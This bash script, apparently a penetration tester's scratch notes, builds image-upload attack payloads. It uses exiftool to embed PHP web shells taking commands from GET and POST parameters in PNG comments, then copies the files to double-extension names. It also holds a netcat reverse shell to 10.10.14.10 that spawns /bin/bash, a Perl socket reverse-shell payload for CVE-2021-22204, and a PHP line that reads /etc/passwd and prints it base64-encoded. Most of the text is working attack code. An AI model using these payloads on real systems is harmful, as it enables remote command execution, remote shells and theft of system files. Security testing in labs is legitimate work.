#!/bin/bash

# From a base test image, create several different payload options for testing PHP code injection on image file uploads


image="test.png"


exiftool -preserve -o test1.png -Comment='<?php system($_GET["cmd"]); ?>' test-orig.png
cp test1.png test1.php.png

exiftool -preserve -o test1a.png -Comment='<?php system($_POST["cmd"]); ?>' test-orig.png
cp test1a.png test1a.php.png

exiftool -preserve -o test2.png -Comment='<?php echo "</pre>"; system($_GET["cmd"]); ?>' test-orig.png
cp test2.png test2.php.png






exiftool -preserve -o test2.png -Comment='<?php system("nc 10.10.14.10 8440 -e /bin/bash"); ?>' test.png
cp test2.png test2.php.png



exiftool -preserve -o test4.png -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" test.png
cp test4.png test4.php.png





# Check this script that does rev shell: https://github.com/AssassinUKG/CVE-2021-22204/blob/main/CVE-2021-22204.sh


cat <<EOF> payload
(metadata "\c\${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($port,inet_aton('$ip')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};};")
EOF







'<?php \$contents = file_get_contents(\'/etc/passwd\');echo \'<img src="data:image/png;base64,\'.base64_encode($contents).\'">\';?>'




### exiftool syntax reference

# -preserve                     Preserve original modification timestamp
#
#
#



# In bash, these are characters we must escape in single-quoted strings:
# - https://www.baeldung.com/linux/single-quote-within-single-quoted-string
#
# a single quote inside a single-quoted string must be escaped differently
#   put a $ at the very begiinning of a single-quoted string and then a \ before the single-quote to escaped
#       Ex: echo $'my problem quote isn\'t a problem anymore'
#
# The other way you can escape a single-quote is like this:
#       'Problems aren'\''t problems anymore'
#
#
#
#
